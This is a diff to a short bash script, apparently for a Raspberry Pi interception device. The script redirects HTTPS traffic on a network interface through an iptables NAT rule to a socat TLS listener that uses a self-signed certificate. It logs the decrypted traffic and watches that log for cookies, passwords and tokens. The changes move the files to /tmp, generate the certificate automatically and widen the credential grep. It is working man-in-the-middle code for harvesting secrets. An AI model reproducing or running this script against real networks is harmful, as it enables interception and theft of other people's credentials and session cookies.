@@ -1,7 +1,6 @@
 #!/bin/bash
 
 echo '[*] SSL splitting'
-HOME='/home/pi/'
 
 [[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 443) = '' ]] && {
 	iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 443 -j REDIRECT --to-ports 1080
@@ -9,12 +8,20 @@ HOME='/home/pi/'
 
 #[[ $(pgrep /usr/bin/sslsplit) = '' ]] && {
 [[ $(pgrep /usr/bin/socat) = '' ]] && {
-	#screen -dmS sslsplit sslsplit -k $HOME/key.pem -c $HOME/cert.pem -l $HOME/con.log -L $HOME/data.log -P autossl 0.0.0.0 1080
-	screen -dmS sslsplit socat -v openssl-listen:1080,fork,cert=$HOME/cert_key.pem,cafile=$HOME/cert.pem,verify=0 open:$HOME/data.log,creat,append 2> /dev/null
+	truncate -s 1 /tmp/sslsplit.log
+	
+	if [ ! -s /tmp/key.pem -o ! -s /tmp/cert.pem -o ! -s /tmp/cert_key.pem ]; then
+		openssl req -new -x509 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -batch
+		cat /tmp/cert.pem /tmp/key.pem > /tmp/cert_key.pem
+	fi
+
+	#screen -dmS sslsplit sslsplit -k /tmp/key.pem -c /tmp/cert.pem -l /tmp/con.log -L /tmp/sslsplit.log -P autossl 0.0.0.0 1080
+	screen -dmS sslsplit socat -v openssl-listen:1080,fork,cert=/tmp/cert_key.pem,cafile=/tmp/cert.pem,verify=0 open:/tmp/sslsplit.log,creat,append 2> /dev/null
 }
 
-tail -f $HOME/data.log | grep -ai -e cookie -e passw | while read match
+tail -f /tmp/sslsplit.log | while read line
 do
-	echo $match | grep -ai -e cookie -e passw --color=auto
-	led yellow on 2> /dev/null
+	if echo "$line" | grep -ai -e cookie -e passw -e token --color=auto; then
+		led yellow on 2> /dev/null
+	fi
 done
